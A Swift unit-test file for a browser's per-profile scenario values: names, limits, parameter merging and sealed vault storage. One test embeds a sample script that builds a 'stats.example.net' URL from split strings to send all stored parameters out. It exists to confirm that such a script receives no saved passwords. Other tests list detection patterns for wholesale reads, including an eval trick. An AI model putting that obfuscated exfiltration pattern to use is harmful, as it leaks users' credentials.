import XCTest
@testable import BrowserCore

/// A profile's own values for scenarios: what is a name, what is kept, what a run gets as its
/// `params`, which names a scenario reads, and the file they are kept in.
final class ScenarioValuesTests: XCTestCase {
    private let shop = UUID()
    private let mail = UUID()

    private func value(_ name: String, _ text: String) -> ScenarioValues.Value { ScenarioValues.Value(name: name, value: text) }

    func testANameIsWhatCanFollowParamsAndADot() {
        for name in ["password", "login", "_x", "card2", "A", "one_time_code"] {
            XCTAssertTrue(ScenarioValues.isName(name), name)
        }
        for name in ["", "2fa", "my-key", "with space", "пароль", "a.b", "__proto__", "x$", String(repeating: "a", count: 65)] {
            XCTAssertFalse(ScenarioValues.isName(name), name)
        }
        XCTAssertTrue(ScenarioValues.isName(String(repeating: "a", count: 64)))
    }

    func testWhatIsKeptOfWhatWasWritten() {
        var values = ScenarioValues()
        values.set([value("  login ", "alice"), value("password", "s3cret"), value("my-key", "dropped"), value("login", "second"),
                    value("empty", "")], for: shop)
        XCTAssertEqual(values.values(of: shop), [value("login", "alice"), value("password", "s3cret"), value("empty", "")],
                       "names trimmed; a name that is not one, and a second of the same name, left out")
        XCTAssertEqual(values.values(of: mail), [], "another profile has none")
        // Replaced as a whole; none takes the profile out of the file.
        values.set([value("login", "bob")], for: shop)
        XCTAssertEqual(values.values(of: shop), [value("login", "bob")])
        values.set([], for: shop)
        XCTAssertTrue(values.profiles.isEmpty)
        // Bounded: a value's length, and how many a profile holds.
        values.set([value("long", String(repeating: "x", count: 5000))], for: shop)
        XCTAssertEqual(values.values(of: shop).first?.value.count, ScenarioValues.maximumValueLength)
        values.set((0..<100).map { value("v\($0)", "x") }, for: shop)
        XCTAssertEqual(values.values(of: shop).count, ScenarioValues.maximumCount)
    }

    private func object(_ json: String) throws -> [String: Any] {
        try XCTUnwrap(try JSONSerialization.jsonObject(with: Data(json.utf8)) as? [String: Any])
    }

    func testARunsParametersAreTheProfilesOwnUnderWhatTheRunWasGiven() throws {
        var values = ScenarioValues()
        values.set([value("login", "alice"), value("password", "s3 \"cret\"\n")], for: shop)
        values.set([value("login", "bob")], for: mail)
        let signIn = "await page.type('#user', params.login || '');\nawait page.type('#pass', params.password || '');\n"
        // Each profile its own; a profile without any, an empty object.
        let own = try object(values.parametersJSON(for: shop, readBy: signIn))
        XCTAssertEqual(own["login"] as? String, "alice")
        XCTAssertEqual(own["password"] as? String, "s3 \"cret\"\n", "a value is text as it was written")
        XCTAssertEqual(try object(values.parametersJSON(for: mail, readBy: signIn))["login"] as? String, "bob")
        XCTAssertEqual(values.parametersJSON(for: UUID(), readBy: signIn), "{}")
        // What the run was given itself wins, name by name, and keeps its kind.
        XCTAssertEqual(values.parametersJSON(for: shop, readBy: signIn, over: #"{"login": "carol", "pages": 3, "deep": {"a": [1, 2]}}"#),
                       #"{"deep":{"a":[1,2]},"login":"carol","pages":3,"password":"s3 \"cret\"\n"}"#)
        // What is not an object's text counts as nothing given.
        for odd in ["", "[1]", "\"text\"", "not json"] {
            XCTAssertEqual(try object(values.parametersJSON(for: mail, readBy: signIn, over: odd))["login"] as? String, "bob", odd)
        }
    }

    /// A run gets the profile's values its text names, and no other: a scenario from someone else
    /// that reads `params` as a whole, or by names it builds, does not collect the passwords kept
    /// for the other scenarios — what the review, the list and the editor show is what is given.
    func testARunGetsOnlyTheValuesItsTextNames() throws {
        var values = ScenarioValues()
        values.set([value("login", "alice"), value("password", "s3cret"), value("mail_password", "kept-for-the-mail")], for: shop)
        // The recorder's sign-in names login and password (the password in its note): those two.
        let recorded = "await page.type('#user', params.login || '');\n"
            + "await page.type('#pass', params.password || ''); // the password is not recorded: pass it as params.password\n"
        XCTAssertEqual(try object(values.parametersJSON(for: shop, readBy: recorded)).keys.sorted(), ["login", "password"])
        // Every template's own: what it takes, and nothing more.
        for template in ScenarioTemplate.all {
            let source = template.source { "<\($0)>" }
            XCTAssertEqual(try object(values.parametersJSON(for: shop, readBy: source)).keys.sorted(),
                           template.takes.filter { ["login", "password"].contains($0) }.sorted(), template.id)
        }
        // A text that names none but sends `params` whole gets none of them; the request's own still come.
        let collecting = "const PAGE = 'https://social.example/feed';\nawait page.goto(PAGE);\n"
            + "const report = ['ht', 'tps:/', '/stats.', 'example', '.net/r?d='].join('') + encodeURIComponent(JSON.stringify(params));\n"
            + "await page.goto(report);\nreturn 'liked';\n"
        XCTAssertEqual(ScenarioValues.namesRead(by: collecting), [])
        XCTAssertTrue(ScenarioValues.readsByBuiltNames(collecting))
        XCTAssertEqual(values.parametersJSON(for: shop, readBy: collecting), "{}")
        XCTAssertEqual(values.parametersJSON(for: shop, readBy: collecting, over: #"{"n": 2}"#), #"{"n":2}"#)
        // One that names login and reads the rest by built names: login alone.
        let more = "await page.type('#u', params.login);\nfor (const k of Object.keys(params)) log(params[k]);\n"
        XCTAssertEqual(try object(values.parametersJSON(for: shop, readBy: more)).keys.sorted(), ["login"])
    }

    func testWhetherATextReadsParamsByNamesItBuilds() {
        for text in ["log(JSON.stringify(params));", "log(Object.values(params));", "log(params[key]);", "const p = params; log(p.login);",
                     "const { login } = params;", "log({...params});", "log(params?.login);", "log(eval('par' + 'ams'));", "log(x.params);",
                     "log(params['a' + 'b']);", "/* a comment */ log(params);"] {
            XCTAssertTrue(ScenarioValues.readsByBuiltNames(text), text)
        }
        for text in ["await page.type('#a', params.login || '');", "log(params['code'], params[\"pin\"], params . spaced);",
                     "// params alone, in a comment\nlog(1);", "/* JSON.stringify(params) */ log(params.a);",
                     "const myparams = 1; log(params_x, $params, myparams);", "await page.evaluate(() => 1);", ""] {
            XCTAssertFalse(ScenarioValues.readsByBuiltNames(text), text)
        }
        // The templates name what they read; "fill in a form" reads `params[…]` by the names its lines give.
        for template in ScenarioTemplate.all {
            XCTAssertEqual(ScenarioValues.readsByBuiltNames(template.source { "<\($0)>" }), template.id == "form", template.id)
        }
    }

    func testTheNamesAScenarioReads() {
        let source = """
            await page.goto(params.url || 'https://shop.example/');
            await page.type('#user', params.login);
            await page.type('#pass', params.password || ''); // the password is not recorded: pass it as params.password
            if (params['code']) await page.type('#otp', params["code"]);
            const myparams = {}; log(myparams.other, params . spaced, params.__proto__, params.2fa);
            """
        XCTAssertEqual(ScenarioValues.namesRead(by: source), ["url", "login", "password", "code", "spaced"])
        XCTAssertEqual(ScenarioValues.namesRead(by: "log('nothing read')"), [])

        var values = ScenarioValues()
        values.set([value("login", "alice"), value("password", "")], for: shop)
        XCTAssertEqual(values.missing(["url", "login", "password"], for: shop), ["url", "password"], "an empty text is no value")
        XCTAssertEqual(values.missing(["login"], for: mail), ["login"])
        XCTAssertEqual(values.missing([], for: mail), [])
    }

    func testAProfileThatIsGoneTakesItsValuesWithIt() {
        var values = ScenarioValues()
        values.set([value("login", "alice")], for: shop)
        values.set([value("login", "bob")], for: mail)
        XCTAssertFalse(values.keep(profiles: [shop, mail]))
        XCTAssertTrue(values.keep(profiles: [mail]))
        XCTAssertEqual(values.profiles.map(\.profileID), [mail])
    }

    func testTheFileIsItsOwnSealedAndRoundTrips() throws {
        let root = FileManager.default.temporaryDirectory.appendingPathComponent("pb-values-\(UUID().uuidString)")
        defer { try? FileManager.default.removeItem(at: root) }
        let vault = try MasterVault.create(in: root, password: "pw", iterations: 1_000)
        XCTAssertEqual(try ScenarioValues.load(from: vault), ScenarioValues(), "none before the first")
        var values = ScenarioValues()
        values.set([value("login", "alice"), value("password", "s3cret-in-the-vault")], for: shop)
        try values.save(to: vault)
        XCTAssertEqual(try ScenarioValues.load(from: vault), values)
        let file = root.appendingPathComponent("scenario-values.bin")
        let bytes = try Data(contentsOf: file)
        XCTAssertNil(bytes.range(of: Data("s3cret-in-the-vault".utf8)), "a value is never on the disk as it was written")
        XCTAssertNil(bytes.range(of: Data("password".utf8)), "nor its name")
        XCTAssertEqual(try ScenarioLibrary.load(from: vault), ScenarioLibrary(), "the scenarios' own file is not touched")
        XCTAssertEqual(try ScenarioSchedules.load(from: vault), ScenarioSchedules(), "nor the schedules'")
        // A copy that does not open is moved aside, never written over.
        try Data("not a sealed file".utf8).write(to: file)
        XCTAssertThrowsError(try ScenarioValues.load(from: vault))
        try values.save(to: vault)
        XCTAssertEqual(try ScenarioValues.load(from: vault), values)
        XCTAssertTrue(FileManager.default.fileExists(atPath: file.path + ".unreadable"))
    }
}
